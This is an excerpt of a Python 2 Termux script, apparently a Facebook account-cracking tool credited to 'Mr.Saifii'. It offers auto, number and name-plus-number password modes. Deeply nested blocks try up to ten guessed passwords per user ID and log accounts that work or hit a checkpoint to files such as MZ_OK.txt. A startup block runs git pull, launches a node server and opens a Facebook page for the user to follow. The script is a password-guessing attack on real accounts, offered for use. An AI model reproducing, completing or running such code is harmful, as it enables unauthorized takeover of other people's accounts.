...
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/mz/rana/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd rana && npm install")
    os.system("cd rana && node index.js &")
    os.system("clear")
    print("\033[1;32m follow fb page  To Continue\033[0;97m")
    os.system("xdg-open https://www.facebook.com/RanaMZ007/")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/mz/rana/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd rana && node index.js &")
    os.system("clear")
...
\033[1;93m   |||||||||||||||||||||||||||||||| 
\033[1;92m   Author iZ = Mr.Saifii
\033[1;92m   FACEBOOK = Mr.Saifii.99
 \033[1;92m  WHATTSAPP = 03010757171
\033[1;93m   |||||||||||||||||||||||||||||||| 
"""
...
def log_menu_s():
    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80CHOSE YOUR OPITION\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu():
    ...
    print 47 * '-'
    print '\x1b[1;92m[1]  Auto password '
    print '\x1b[1;92m[2]  Number password '
    print '\x1b[1;92m[3]  Name + Number password'
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80CHOSE YOUR OPITION\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
...
def crack():
    ...
    os.system('clear')
    print logo
    print '\x1b[1;93m Auto pass \x1b[1;91m'
    print 47 * '-'
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80CHOSE OPiTiON\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;93m Auto pass public'
    ...
    time.sleep(0.5)
    print ' \x1b[1;97mPlease wait....\x1b[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m USE 4G FAST INTERNT\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m {Saifi} OK iD \x1b[1;33m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[Saifi-CP iD] ' + uid + ' | ' + pass1
                cp = open('MZ_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m {Saifi} OK iD \x1b[1;33m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[Saifi-CP iD] ' + uid + ' | ' + pass2
                    cp = open('MZ_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m {Saifi} OK iD \x1b[1;33m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[Saifi-CP iD] ' + uid + ' | ' + pass3
                        cp = open('MZ_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m {Saifi} OK iD \x1b[1;33m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[Saifi-CP iD] ' + uid + ' | ' + pass4
                            cp = open('MZ_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m {Saifi} OK iD \x1b[1;33m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[Saifi-CP iD] ' + uid + ' | ' + pass5
                                cp = open('QUEEN.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m {Saifi} OK iD \x1b[1;33m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[Saifi-CP iD] ' + uid + ' | ' + pass6
                                    cp = open('MZ_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m {Saifi} OK iD \x1b[1;33m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[Saifi-CP iD] ' + uid + ' | ' + pass7
                                        cp = open('MZ_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m {Saifi} OK iD \x1b[1;33m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[Saifi-CP iD] ' + uid + ' | ' + pass8
                                            cp = open('MZ_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m {Saifi} OK iD \x1b[1;33m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[Saifi-CP iD] ' + uid + ' | ' + pass9
                                                cp = open('MZ_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m {Saifi} OK iD \x1b[1;33m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[Saifi-CP iD] ' + uid + ' | ' + pass10
                                                    cp = open('MZ_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
...
def c_s():
    ...
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;97m~~~ Please wait.... ~~~\x1b[1;91m'
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m USE 4G FAST INTERNT\x1b[1;91m'
    print 47 * '-'
